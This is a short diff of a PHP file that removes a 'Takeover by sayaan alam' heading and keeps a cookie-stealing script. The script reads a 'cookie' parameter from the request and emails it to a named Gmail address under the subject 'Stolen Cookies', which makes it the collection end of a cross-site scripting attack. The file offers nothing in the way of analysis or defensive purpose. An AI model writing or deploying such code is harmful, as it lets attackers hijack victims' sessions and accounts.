@@ -1,4 +1,3 @@
-<h1>Takeover by sayaan alam</h1>
 <?php
 $cookie = $HTTP_GET_VARS[“cookie”]; mail(“alamhumaid49@gmail.com”, “Stolen Cookies”, $cookie);
 ?>
